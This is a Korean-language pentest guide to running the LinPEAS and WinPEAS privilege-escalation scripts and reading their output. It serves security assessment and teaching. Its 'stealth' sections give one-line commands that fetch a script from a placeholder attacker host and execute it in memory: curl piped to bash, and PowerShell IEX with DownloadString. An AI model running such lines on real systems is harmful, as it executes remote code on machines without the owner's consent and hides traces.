

# PEASS (LinPEAS & WinPEAS) 활용 가이드

PEASS(Privilege Escalation Awesome Scripts SUITE)는 Linux와 Windows 시스템에서 권한 상승(Privilege Escalation) 경로를 자동으로 찾아주는 스크립트 모음입니다. 시스템의 설정 오류, 취약한 권한, 커널 취약점 등 다양한 정보를 종합적으로 분석하여 권한 상승 기회를 식별하는 데 매우 효과적입니다.

- **[PEASS GitHub Releases 링크](https://github.com/peass-ng/PEASS-ng/releases)**

---

### **1. LinPEAS (Linux Privilege Escalation Awesome Script)**

- **목적:** Linux 시스템의 권한 상승 벡터를 종합적으로 분석합니다. SUID/SGID 파일, Cron 작업, 서비스 권한, 커널 버전, 네트워크 설정 등 방대한 정보를 수집하여 색상으로 중요도를 표시해줍니다.

#### **다운로드 및 실행**
```bash(title="LinPEAS 다운로드 및 실행")
# 최신 버전의 linpeas.sh 다운로드
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# 실행 권한 부여
chmod +x linpeas.sh

# 실행 (결과가 많으므로 파일로 리다이렉션 권장)
./linpeas.sh > linpeas_results.txt
```

#### **인메모리 실행 (스텔스)**
- 디스크에 파일을 남기지 않고 메모리에서 직접 실행하는 방법입니다. (자세한 내용은 `Linux 명령어 인코딩 및 실행 기법` 가이드 참고)

```bash(title="LinPEAS 인메모리 실행")
curl -s http://<attacker_ip>/linpeas.sh | bash
```

---

### **2. WinPEAS (Windows Privilege Escalation Awesome Script)**

- **목적:** Windows 시스템의 권한 상승 벡터를 종합적으로 분석합니다. 서비스 권한, 레지스트리 설정, 사용자 권한, 설치된 소프트웨어, 네트워크 설정 등 다양한 정보를 수집합니다.

#### **다운로드 및 실행**
```powershell(title="WinPEAS 다운로드 및 실행")
# 최신 버전의 winPEASany.exe 다운로드
# (파일 전송 가이드 참고하여 타겟에 업로드)

# 실행 (결과가 많으므로 파일로 리다이렉션 권장)
C:\Path\To\winPEASany.exe > winpeas_results.txt
```

#### **PowerShell을 이용한 인메모리 실행**
- `winPEAS.ps1` 스크립트 버전을 사용하여 PowerShell에서 직접 실행할 수 있습니다.

```powershell(title="WinPEAS PowerShell 인메모리 실행")
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/winPEAS.ps1')"
```

---

### **3. 결과 분석 팁**

- **색상 코드:** PEASS 스크립트들은 출력 결과에 색상을 사용하여 중요도를 표시합니다. 일반적으로 빨간색은 매우 중요하거나 직접적인 권한 상승 기회를 나타내고, 노란색은 잠재적인 취약점이나 추가 조사가 필요한 부분을 의미합니다.
- **키워드 검색:** 출력 파일에서 `[+]`, `!!!`, `VULNERABLE`, `HIGH` 등의 키워드를 검색하여 중요한 정보를 빠르게 찾을 수 있습니다.
- **수동 확인:** PEASS가 찾아낸 특정 항목(예: SUID 바이너리, 취약한 서비스)에 대해서는 해당 가이드(예: `SUID/SGID 파일`, `취약한 서비스 권한`)를 참고하여 수동으로 다시 한번 확인하고 공격을 시도하는 것이 좋습니다.




